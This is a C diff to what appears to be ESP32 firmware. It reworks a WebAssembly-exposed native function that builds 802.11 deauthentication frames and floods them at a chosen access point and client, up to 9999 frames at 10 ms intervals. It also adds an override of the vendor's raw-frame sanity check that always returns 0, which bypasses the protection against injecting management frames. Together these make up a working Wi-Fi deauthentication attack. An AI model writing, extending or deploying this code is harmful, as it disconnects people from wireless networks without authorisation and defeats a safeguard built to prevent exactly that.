@@ -263,16 +263,12 @@ int akira_native_wifi_scan_aps(wasm_exec_env_t exec_env,
         { return -EFAULT; }                                              \
     } while (0)
 
-struct __attribute__((packed)) deauth_frame {
-    uint8_t  fc[2];
-    uint8_t  dur[2];
-    uint8_t  da[6];
-    uint8_t  sa[6];
-    uint8_t  bssid[6];
-    uint8_t  seq[2];
-    uint8_t  reason[2];
-};
-BUILD_ASSERT(sizeof(struct deauth_frame) == 26, "deauth_frame must be 26 bytes");
+int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
+{
+    (void)arg; (void)arg2; (void)arg3;
+    /* return 0 to bypass*/
+    return 0;
+}
 
 #define DEAUTH_MAX_COUNT       9999
 #define DEAUTH_MIN_INTERVAL_MS   10
@@ -292,12 +288,24 @@ int akira_native_wifi_deauth(wasm_exec_env_t exec_env,
     WASM_ADDR_CHECK(inst, bssid_ptr,  6);
     WASM_ADDR_CHECK(inst, client_ptr, 6);
 
+    /* WAMR auto-translates `*`-sig params to native pointers */
     const uint8_t *bssid  = (const uint8_t *)bssid_ptr;
     const uint8_t *client = (const uint8_t *)client_ptr;
 
+    /* Set channel for deauth frames */
     esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
 
-    struct deauth_frame frame;
+    /* Build deauth frame */
+    struct __attribute__((packed)) {
+        uint8_t  fc[2];
+        uint8_t  dur[2];
+        uint8_t  da[6];
+        uint8_t  sa[6];
+        uint8_t  bssid[6];
+        uint8_t  seq[2];
+        uint8_t  reason[2];
+    } frame;
+
     frame.fc[0]     = 0xC0; frame.fc[1]     = 0x00;
     frame.dur[0]    = 0x3A; frame.dur[1]    = 0x01;
     frame.reason[0] = 0x07; frame.reason[1] = 0x00;
@@ -311,8 +319,12 @@ int akira_native_wifi_deauth(wasm_exec_env_t exec_env,
         frame.seq[0] = (uint8_t)(seq & 0xFF);
         frame.seq[1] = (uint8_t)(seq >> 8);
 
-        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), true);
-        if (err == ESP_OK) sent++;
+        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, &frame, sizeof(frame), true);
+        if (err == ESP_OK) {
+            sent++;
+        } else {
+            LOG_ERR("wifi_deauth: tx failed err=%d (0x%x)", err, err);
+        }
 
         if (i < count - 1) k_msleep(interval_ms);
     }
